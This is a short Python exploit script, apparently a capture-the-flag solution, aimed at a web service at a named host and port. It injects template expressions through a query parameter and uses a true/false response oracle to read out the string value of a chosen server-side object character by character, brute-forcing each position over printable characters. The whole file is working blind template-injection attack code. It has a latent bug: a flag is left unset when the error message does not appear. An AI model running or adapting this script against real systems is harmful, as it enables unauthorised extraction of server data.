#/usr/bin/env python3
import requests as r
import string

url = "http://ssh.metamon.xyz:15378/"

# if object is primitive one, obj.__str__ accepts 0 argument. => Use (len_payload2, payload2)

true_stub = "true" * 4
false_stub = "false" * 4

len_payload1 = '''
    {{% set t = {} %}}
    {{% for i in t.__str__(t) %}}a{{% endfor %}}
'''

len_payload2 = '''
    {{% set t = {} %}}
    {{% for i in t.__str__() %}}a{{% endfor %}}
'''

payload1 = '''{{% set t = {} %}}{{% if t.__str__(t)[{}] {} {} %}}''' + true_stub + '''{{% else %}}''' + false_stub + '''{{% endif %}}'''

payload2 = '''{{% set t = {} %}}{{% if t.__str__()[{}] {} {} %}}''' + true_stub + '''{{% else %}}''' + false_stub + '''{{% endif %}}'''

# get object's length and primitivity.
def get_obj_info(obj):
    str_err_msg = "TypeError: expected 0 arguments, got 1"

    params = {'t' : len_payload1.format(obj)}

    p = r.get(url, params=params)
    if str_err_msg in p.text:
        is_primitive = True
        params['t'] = len_payload2.format(obj)
        p = r.get(url, params=params)

    print("'" + p.text + "'")

    length = p.text.count('a')
    p.close()
    return (is_primitive, length)


def search(obj, length, is_primitive, start=0):
    res = ""
    for i in range(start, length):
        for c in string.printable:
            _payload = payload2 if is_primitive else payload1
            payload = _payload.format(obj, i, "==", repr(c))
            p = r.get(url, params={"t" : payload})
            text = p.text
            p.close()
            if true_stub in text:
                res += c
                print("res : " + res)
                break
    return res
            

def main():
    obj = input("target object : ")
    if "{{" in obj:
        print("That's impossible :(")
        return
    (is_primivite, length) = get_obj_info(obj)
    print("length of str(obj) = %d" % length)
    while 1:
        start = int(input("from which index you wanna start read : "))
        search(obj, length, is_primivite, start)

if __name__ == "__main__":
    main()
